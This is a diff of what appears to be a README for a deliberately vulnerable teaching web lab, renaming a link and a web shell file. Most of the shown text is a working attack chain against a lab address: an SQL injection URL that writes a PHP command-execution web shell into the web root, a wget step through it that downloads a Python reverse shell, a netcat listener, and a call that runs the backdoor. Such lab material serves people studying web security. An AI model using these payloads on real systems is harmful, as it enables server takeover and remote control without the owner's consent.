@@ -31,25 +31,25 @@ Play Around with SQL Injection
 ------------------------------
 
 I have added an example of how to exploit an SQL Injection vulnerability by changing the passwords of all users in the user table.
-<a href="sql-injection-play.php">SQL Injection Play</a>. You need to reload the page to see the results as the select query is executed before the update request.
+<a href="sql-injection-playground.php">SQL Injection Playground</a>. You need to reload the page to see the results as the select query is executed before the update request.
 
 
 Gain Shell Access to Webserver with the Help of SQL Injection
 -------------------------------------------
 
 Inject SQL that will create a PHP script that will run passed commads:
-http://192.168.30.99/login.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
+http://192.168.30.99/login.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/system.php%22;  
 
 __PYTHON BACKDOOR__
 
 Download Python reverse shell  
-http://192.168.30.99/images/cmd.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py
+http://192.168.30.99/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py
 
 Setup the waiting prompt on your host machine - Netcat must be installed:  
 `nc -nlvp 4444`
 
 Run new Python reverse shell.  
-http://192.168.30.99/images/cmd.php?cmd=/tmp/reverse-shell.py
+http://192.168.30.99/images/system.php?cmd=/tmp/reverse-shell.py
 
 The terminal on the host machine waiting for connection should be connected now. Try typing `ls -l /var/www/web` to see the files listed.
 
